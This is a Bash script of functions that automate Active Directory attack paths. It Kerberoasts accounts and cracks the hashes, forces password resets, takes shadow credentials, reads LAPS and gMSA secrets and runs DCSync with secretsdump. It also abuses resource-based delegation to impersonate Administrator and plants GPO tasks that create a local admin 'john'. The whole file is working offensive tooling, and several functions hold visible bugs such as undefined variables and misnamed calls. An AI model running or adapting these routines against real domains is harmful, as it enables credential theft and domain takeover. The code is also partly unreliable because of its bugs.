get_ticket() {
    local DC_FQDN=""
    local USERNAME=""
    local PASSWORD=""
    local HASH=""

    # Parse command-line arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--username)
                USERNAME="$2"
                USERNAME="${USERNAME^^}"
                shift 2
                ;;
            -p|--password)
                PASSWORD="$2"
                shift 2
                ;;
            -H|--hash)
                HASH="$2"
                shift 2
                ;;
            *)
                DC_FQDN="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$DC_FQDN" || -z "$USERNAME" ]]; then
        echo -e "Usage: get_ticket DC_FQDN -u USERNAME [-p PASSWORD | -H HASH]"
        return 1
    fi

    if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
        echo -e "${RED}[-] ERROR: Cannot specify both password and hash${NC}"
        return 1
    fi

    if [[ -z "$PASSWORD" && -z "$HASH" ]]; then
        echo -e "${RED}[-] ERROR: Must specify either password or hash${NC}"
        return 1
    fi

    echo -e "\n[*] Generating TGT for \"$USERNAME\""
    
    if [[ -n "$HASH" ]]; then
        output=$(nxc smb "$DC_IP" -u "$USERNAME" -H "$HASH" -k --generate-tgt "./$USERNAME" 2>&1)
        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
            echo -e "$output" > /dev/tty
            return 1
        fi
    elif [[ -n "$PASSWORD" ]]; then
        output=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -k --generate-tgt "./$USERNAME" 2>&1)
        if [[ ! -f "./$USERNAME.ccache" ]] || ! grep -q "[+]" <<< "$output"; then
            echo -e "[-] TGT Generation Failed, did you configure the AD realm?"
            echo -e "$output" > /dev/tty
            return 1
        fi
    fi

    export KRB5CCNAME="./${USERNAME}.ccache"
    echo -e "${BLUE}[+] Ticket ${USERNAME}.ccache created and saved in current dir. ${NC}" >/dev/tty
}



hashcat_crack() {
    local hash_file="$1"  # This should be a FILE containing the hash, not the hash itself
    local mode="$2"

    while true; do
        read -e -p "[?] Path to wordlist (or 'exit' to quit): " WORDLIST </dev/tty
        [[ "$WORDLIST" == "exit" ]] && { echo -e "[!] Exiting."; return 0; }
        
        [[ ! -f "$WORDLIST" ]] && { echo -e "[-] Wordlist not found!"; continue; }

        echo -e "[*] Cracking with hashcat..."
        hashcat -m "$mode" -a 0 -w 3 -O -o cracked.txt "$hash_file" "$WORDLIST" </dev/tty

        if [[ -s "cracked.txt" ]]; then
            CRACKED_PASS=$(awk -F':' '{print $NF}' cracked.txt)
            echo -e "[+] Success! Password: $CRACKED_PASS"
            export CRACKED_PASS
            rm -f cracked.txt
            return 0
        else
            echo -e "[-] No password found."
        fi
    done
}


MemberOf(){
    return 0
} 


WriteSPN(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteSPN--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "$TARGET" > ./users_file.txt
    local OUTPUT=$($targetedkerberoast -d "$DOMAIN" -U ./users_file.txt -u "$SRC" -k --no-pass --dc-host "$DC_FQDN" -f hashcat 2>&1)
    
    # Extract the hash
    local KERB_HASH=$(echo -e "$OUTPUT" | grep -oP '\$krb5tgs\$[^\s]*')
    if [ -z "$KERB_HASH" ]; then
        echo -e "[-] Failed to get Kerberoast hash with output \n $OUTPUT" >/dev/tty
        return 1
    fi
    
    echo -e "[+] Obtained Kerberos hash:" >/dev/tty
    echo -e "$KERB_HASH" >/dev/tty
    echo -e "$KERB_HASH" > "$TARGET".hash

    hashcat_crack "$TARGET.hash" 13100
    get_ticket "$DC_FQDN" -u "$TARGET" -p "$CRACKED_PASS"
}

AllowedToDelegate(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllowedToDelegate--> $3\" \n${NC}" >/dev/tty
    
    export KRB5CCNAME="./$SRC.ccache"
    if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$SRC"; then
        echo -e "[-] getST failed" > /dev/tty
        return 1
    fi
    mv ./*cifs*"$TARGET"*"$DOMAIN".ccache ./"$TARGET".ccache
}

AddKeyCredentialwLink(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddKeyCredentialLink--> $3\" \n${NC}" >/dev/tty
    
    export KRB5CCNAME="./$SRC.ccache"

    local output
    output=$(certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP" -ldap-scheme ldap -ns $DC_IP -dns-tcp -target "$DC_FQDN" 2>&1 | tee /dev/tty)

    # Failed to get both ticket and hash
    if [[ "$output" == *"[-] Got error while trying to request TGT"* ]] && [[ "$output" == *"NT hash for"*"None"* ]]; then
        return 1
    fi

    # Ticket created
    if [[ "$output" == *"Got TGT"* ]]; then
        mv "${TARGET,,}.ccache" "$TARGET.ccache"
        # Hash retrieved
        if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
            hash="${BASH_REMATCH[1]}"
            echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
        fi
        echo -e "${BLUE}[+] Ticket ${TARGET}.ccache created and saved in current dir. ${NC}" >/dev/tty
        return 0
    fi
    
    # Hash retrieved but no ticket
    if [[ "$output" =~ "NT hash for '".*"': "([a-f0-9]{32}) ]]; then
        hash="${BASH_REMATCH[1]}"
        echo -e "${BLUE}[+] Extracted NT hash: $hash${NC}" >/dev/tty
        get_ticket "$DC_FQDN" -u "$TARGET" -H "$hash"
        return $?
    fi

    return 1
}

AddSelf() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddSelf--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"
    
    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add groupMember "$TARGET" "$SRC"; then
        return 1
    else
        return 0
    fi
}

ForceChangePassword() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ForceChangePassword--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"
    
    echo -e "${BLUE}\n[+] Setting as new password for \"$TARGET\": P@ssword123!P@ssword123! \n${NC}"

    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set password "$TARGET" 'P@ssword123!P@ssword123!'; then
        echo -e "[-] ERROR: Failed to change password for $TARGET" >&2
        return 1
    fi
    
    if ! get_ticket "$DC_FQDN" -u "$TARGET" -p 'P@ssword123!P@ssword123!'; then
        return 1
    fi

    return 0
}

WriteOwner() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteOwner--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if ! bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k set owner "$TARGET" "$SRC"; then
        echo -e "[-] Failed to give WriteDACL for $TARGET"
        return 1
    fi
    if ! WriteDACL "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
        echo -e "[-] Failed to WriteOwner for $TARGET"
        return 1
    fi
    return 0
}

WriteDACL(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteDACL--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if [[ "$TARGET_TYPE" == "Domain" ]]; then
        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add dcsync "$SRC"
        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    else
        bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k add genericAll "$TARGET" "$SRC"
        GenericAll "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    fi
    return 0
}
Owns(){
    echo -e "Skipping Owns Node" >/dev/tty
    return 0
}

AllExtendedRights(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AllExtendedRights--> $3\" \n${NC}" >/dev/tty

    if [ "$TARGET_TYPE" == 'Users' ]; then
        ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"

    elif [ "$TARGET_TYPE" == 'Computers' ]; then
        ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"

    elif [ "$TARGET_TYPE" == 'Domain' ]; then
        DCSync "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    
    else
        echo -e "[-] ERROR: Invalid target type '$TARGET_TYPE'" >/dev/tty
        echo -e "[-] Valid target types are: Users, Computers, Domain" >/dev/tty
        return 1
    fi
}

AddMember(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---AddMember--> $3\" \n${NC}" >/dev/tty

    # Get user input with validation
    while true; do
        read -r -p "Input member to add/remove: " member </dev/tty
        if [[ -n "$member" ]]; then
            break
        fi
        echo -e "[-] ERROR: Member cannot be empty" >/dev/tty
    done

    while true; do
        read -r -p "Input action (add/remove): " action </dev/tty
        action=$(echo -e "$action" | tr '[:upper:]' '[:lower:]')
        if [[ "$action" == "add" || "$action" == "remove" ]]; then
            break
        fi
        echo -e "[-] ERROR: Action must be either 'add' or 'remove'" >/dev/tty
    done

    # Execute the operation
    if bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k "$action" groupMember "$TARGET" "$member"; then
        echo -e "[+] Successfully performed $action operation on $member$" >/dev/tty
        return 0
    else
        return 1
    fi
}

GenericWrite(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"
    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericWrite--> $3\" \n${NC}"

    if [[ "$TARGET_TYPE" == "User" ]]; then
        certipy-ad shadow auto -k -no-pass -dc-host "$DC_FQDN" -account "$TARGET" -dc-ip "$DC_IP"
        certipy_rc=$?
        
        if [[ $certipy_rc -eq 0 && -s ${TARGET,,}.ccache ]]; then
            mv ${TARGET,,}.ccache "./${TARGET}.ccache"
            export KRB5CCNAME="./${TARGET}.ccache"
            klist
            exit 0  # Explicitly return success from certipy
        else
            # If certipy failed, try WriteSPN
            if WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
                exit $?  # Return WriteSPN's return code (should be 0 if successful)
            else
                # If WriteSPN failed, try ForceChangePassword and return its code
                ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
                exit $?  # Return ForceChangePassword's return code
            fi
        fi
    elif [[ "$TARGET_TYPE" == "Group" ]]; then
        AddMember "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    elif [[ "$TARGET_TYPE" == "OU" ]]; then
        WriteGPLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
    fi
}


ReadLAPSPassword() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadLAPSPassword--> $3\" \n${NC}" >/dev/tty

    # LAPS password retrieval
    laps=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get search --filter '(ms-mcs-admpwd=*)' --attr ms-mcs-admpwd 2>&1)
    if [[ ! -z "$laps" ]]; then
        echo -e "[+] Found LAPS Password: $laps" >/dev/tty
        echo -e "Attempting Local Admin Authentication on \"$TARGET\"" >/dev/tty
        nxc smb -u Administrator -p "$laps" --local-auth -x "whoami" >/dev/tty
        nxc smb -u Administrator -p "$laps" -x "whoami" >/dev/tty
        return 0
    else
        echo -e "[-] No LAPS password found" >/dev/tty
        return 1
    fi
}


ReadGMSAPassword(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---ReadGMSAPassword--> $3\" \n${NC}" >/dev/tty
    
    output=$(bloodyAD --host "$DC_FQDN" -d "$DOMAIN" -k get object "$TARGET" --attr msDS-ManagedPassword)
    target_hash=$(echo -e "$output" | grep -i msDS-ManagedPassword.NTLM | awk -F":" '{print $3}')
    echo -e "Found \"$TARGET\" Hash: $target_hash" >/dev/tty
    if get_ticket "$DC_FQDN" -u "$TARGET" -H "$target_hash"; then
        return 0
    else
        return 1
    fi
}

DCSync(){                    
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"
    export KRB5CCNAME="./$SRC.ccache"
    
    dom_base=$(echo $DOMAIN | awk -F"." '{print $1}')

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---DCSync--> $3\" \n${NC}" >/dev/tty

    while true; do
        echo -e "Do you want to dump:" >/dev/tty
        echo -e "1. Administrator account only" >/dev/tty
        echo -e "2. Specific user(s)" >/dev/tty
        echo -e "3. All users" >/dev/tty
        read -p "Enter your choice (1-3): " choice </dev/tty
            
        case $choice in
            1)
                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\Administrator"; then
                    return 1
                fi
                break
                ;;
            2)
                read -p "Enter username(s) to dump (comma-separated for multiple): " users </dev/tty
                IFS=',' read -ra user_array <<< "$users"
                for user in "${user_array[@]}"; do
                    if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass -just-dc-user "$dom_base\$user"; then
                        return 1
                    fi
                done
                break
                ;;
            3)
                if ! secretsdump.py "$DOMAIN/@$DC_FQDN" -k -no-pass; then
                    return 1
                fi
                break
                ;;
            *)
                echo -e "[-] Invalid choice, please try again.\n" >/dev/tty
                ;;
        esac
    done
    return 0
}
 

GenericAll() {
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---GenericAll--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    if [[ "$TARGET_TYPE" == "User" ]]; then
        AddKeyCredentialLink "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
        result1=$?
        WriteSPN "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
        result2=$?
        if [[ $result1 -ne 0 ]] && [[ $result2 -ne 0 ]]; then
            ForceChangePassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"
            result3=$?
            if [[ $result3 -ne 0 ]]; then
                return 1
            fi
        fi
        return 0
    fi

    if [[ "$TARGET_TYPE" == "Group" ]]; then
        if ! AddMember "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "Domain" ]]; then
        if ! DCSync "$DC_FQDN" "$cur_user" "$TARGET" "$TARGET_TYPE"; then
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "GPO" ]]; then
#----------------------------------------LDAP AUTH----------------------------------------------
        echo -e "\n[*] LDAP Authentication" >/dev/tty
        # Try to authenticate with prev. ticket
        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
        if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
            echo -e "Authentication successful!" >/dev/tty
        else
            # Manual ldap auth
            PS3="Select authentication method: "
            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
            auth_success=false

            while true; do
                select opt in "${options[@]}"; do
                    case $opt in
                        "Password")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter password: " password </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "[+]Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "[-]Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "NTLM Hash")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Kerberos Ticket")
                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
                            export KRB5CCNAME="$ticket"
                            GPO_ID=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" --query "(objectClass=groupPolicyContainer)" "displayname objectGUID")
                            echo 
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Quit")
                            return 1
                            ;;
                        *) 
                            echo -e "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
                            continue
                            ;;
                    esac
                done
            done

            if ! "$auth_success"; then
                echo -e "Failed to authenticate after multiple attempts" >/dev/tty
                return 1
            fi
        fi
# ------------------------------------------pygpoabuse-------------------------------------------------
        GPO_ID=$(echo -e "$nxc_ouput" | grep -i "Default Domain Policy" -A1 | awk '{print $6}' | tail -n 1)
        if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F"." '{print $1}')" -gpo-id "$GPO_ID" -f 2>&1 | grep -i 'created!' >/dev/tty; then
            echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
            return 1
        else
            echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
            echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
            return 0
        fi   
    fi     

    if [[ "$TARGET_TYPE" == "Computers" ]]; then
        echo -e "\n[*] Trying to read LAPS password..." >/dev/tty
        if ReadLAPSPassword "$DC_FQDN" "$SRC" "$TARGET" "$TARGET_TYPE"; then
            return 0
        fi
        echo -e "[-] Read LAPS Failed, trying GenricAll exploit"
#----------------------------------------LDAP AUTH----------------------------------------------
        echo -e "\n[*] LDAP Authentication" >/dev/tty
        # Try to authenticate with prev. ticket
        nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
        if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
            echo -e "Authentication successful!" >/dev/tty
        else
            # Manual ldap auth
            PS3="Select authentication method: "
            options=("Password" "NTLM Hash" "Kerberos Ticket" "Quit")
            auth_success=false

            while true; do
                select opt in "${options[@]}"; do
                    case $opt in
                        "Password")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter password: " password </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -p "$password" -M maq 2>&1)
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "[+]Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "[-]Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "NTLM Hash")
                            read -p "[?] Enter username: " username </dev/tty
                            read -s -p "[?] Enter NTLM hash: " hash </dev/tty
                            echo
                            nxc_output=$(nxc ldap "$DC_FQDN" -u "$username" -H "$hash" -M maq 2>&1)
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Kerberos Ticket")
                            read -e -p "[?] Enter Kerberos .ccache Path: " ticket </dev/tty
                            export KRB5CCNAME="$ticket"
                            nxc_output=$(nxc ldap "$DC_FQDN" --use-kcache -M maq 2>&1)
                            echo 
                            if echo -e "$nxc_output" | grep -qiP "\[\+\]\ .*\\\\$username"; then
                                echo -e "Authentication successful!" >/dev/tty
                                auth_success=true
                            else
                                echo -e "Authentication failed. Error output:" >/dev/tty
                                echo -e "$nxc_output" >/dev/tty
                                continue
                            fi
                            break 2  # Break out of both select and while loops
                            ;;
                        "Quit")
                            return 1
                            ;;
                        *) 
                            echo -e "Invalid option $REPLY. Please select a valid option (1-4)." >/dev/tty
                            continue
                            ;;
                    esac
                done
            done

            if ! $auth_success; then
                echo -e "Failed to authenticate after multiple attempts" >/dev/tty
                return 1
            fi
        fi
# -------------------------------EXTRACT MAQ------------------------------
        local maq=$(echo -e "$nxc_output" | grep "MachineAccountQuota:" | awk '{print $6}')
        # Check if MAQ was found
        if [[ -n "$maq" && "$maq" =~ ^[0-9]+$ ]]; then
            echo -e "[+] MachineAccountQuota: $maq" >/dev/tty
#---------------------------------MAQ=0-----------------------------------------------
            if [[ "$maq" -eq 0 ]]; then
                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
                echo -e "\n[*] MAQ is 0 -> Trying Password Reset with Password $computer_pass" >/dev/tty
                if ! addcomputer.py -no-pass -k -computer-name '$TARGET$' -computer-pass '$computer_pass' -no-add; then
                    echo -e "[-] Password Reset failed" >/dev/tty
                    return 1
                fi
                getticket "$DC_FQDN" -u "TARGET" -p "$computer_pass"
            else
#--------------------------------MAQ>0------------------------------------------------
                echo -e "\n[*] MAQ is not 0 -> Adding a Computer Account" >/dev/tty
                computer_name="DESKTOP-$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 8 | head -n 1)\$"
                computer_pass=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 32 | head -n 1)
                echo -e "\n[*] Creating a PC account $computer_name with password $computer_pass." >/dev/tty
                if ! addcomputer.py $DOMAIN/ -no-pass -k -computer-name "$computer_name" -computer-pass "$computer_pass" -dc-host $DC_FQDN; then
                    echo -e "[-] Creation failed" >/dev/tty
                    return 1
                fi 
                echo -e "\n[*] Becoming Admin of $TARGET" >/dev/tty
                if ! rbcd.py $DOMAIN/$SRC -no-pass -k -delegate-from "$computer_name" -delegate-to "$TARGET" -action write; then
                    echo -e "[-] rbcd Failed">/dev/tty
                    return 1
                fi 
                get_ticket $DC_FQDN -u $computer_name -p $computer_pass
                echo -e "\n[*] getST: Impersonating Administrator" >/dev/tty
                echo 
                if ! getST.py -k -no-pass -spn "cifs/${TARGET%$}.$DOMAIN" -impersonate Administrator -dc-ip "$DC_FQDN" "$DOMAIN/$computer_name"; then
                    echo -e "[-] getST failed">/dev/tty
                    return 1
                fi
            fi
        else
            echo -e "[-] ERROR: Could not determine MachineAccountQuota" >/dev/tty
            return 1
        fi
    fi

    if [[ "$TARGET_TYPE" == "OU" ]]; then
        echo -e "Giving GenericAll on Non-Admin Child Objects" >/dev/tty
        if dacledit.py "$DOMAIN/$SRC" -no-pass -k -action 'write' -rights 'FullControl' -inheritance -principal "$SRC" -target-dn "$TARGET"; then
            return 0
        fi
        if ! WriteGPLink "$1" "$2" "$3" "$4"; then
            return 1
        fi
    fi
    return 0
}  



WriteGPLink(){
    local DC_FQDN="$1"
    local SRC="$2"
    local TARGET="$3"
    local TARGET_TYPE="$4"
    local DOMAIN="${DC_FQDN#*.}"

    echo -e "${YELLOW}\n[*] Exploiting \"$2 ---WriteGPLink--> $3\" \n${NC}" >/dev/tty
    export KRB5CCNAME="./$SRC.ccache"

    echo -e "\nPlease execute this command on Windows (powershell):\n\n\"New-GPO -Name MyGPO -Comment \"MyGPO\" | New-GPLink -Target \"OU=$TARGET,DC=$(echo $domain | sed 's/\./,DC=/g')\" -LinkEnabled Yes\"" >/dev/tty
    while true; do
        read -rp "Input the GPO ID (or 'exit' to quit): " GPO_ID </dev/tty
        if [[ "$GPO_ID" == "exit" ]]; then
            return 1
        fi
        if [[ -z "$GPO_ID" ]]; then
            echo -e "[-] Invalid GPO ID, try again: " >/dev/tty
            continue
        fi
        break
    done

    # ONLY VALID FOR COMPUTER CHILDS
    if ! $pygpoabuse ${DOMAIN,,}/${SRC,,} -k -ccache "./$SRC.ccache" -dc-ip "$(echo $DC_FQDN | awk -F'.' '{print $1}')" -gpo-id "$GPO_ID" -f -vv | grep -i 'created!' >/dev/tty; then
        echo -e "\nTASK CREATION FAILED! MAKE SURE GPO-ID AND CREDENTIALS ARE CORRECT\n"
        return 1
    else
        echo -e "\nTASK CREATED! EXECUTE \"gpupdate /force\" ON THE WINDOWS HOST TO CREATE LOCAL ADMIN\n"
        echo -e "LOCAL ADMIN CREDENTIALS -> \"john:H4x00r123..\"\n"
        return 0
    fi
}

